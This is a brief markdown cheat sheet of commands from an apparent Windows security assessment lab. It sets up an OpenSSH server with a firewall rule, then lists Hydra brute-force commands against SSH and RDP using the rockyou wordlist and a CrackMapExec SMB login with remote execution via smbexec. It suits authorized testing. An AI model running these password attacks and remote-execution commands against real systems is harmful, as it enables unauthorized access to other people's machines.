# Commands Used in Windows Security Assessment

## SSH Setup on Windows 10

1. **Install OpenSSH Server**:
    ```powershell
    Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
    ```

2. **Start SSH Service**:
    ```powershell
    Start-Service sshd
    ```

3. **Allow SSH Through Firewall**:
    ```powershell
    New-NetFirewallRule -Name "SSHD" -DisplayName "OpenSSH Server" -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22
    ```

## Brute-Force Testing

### Hydra SSH Brute-Force Attack:
```bash
hydra -l username -P /path/to/rockyou.txt ssh://<TARGET_IP> -V -t 4



### Hydra RDP Brute-Force Attack:
hydra -l admin -P /path/to/rockyou.txt rdp://<TARGET_IP>

### SMB Testing with CrackMapExec:
bash
crackmapexec smb <TARGET_IP> -u username -p password --exec-method smbexec


### SSH Login Test
bash
ssh username@<TARGET_IP>
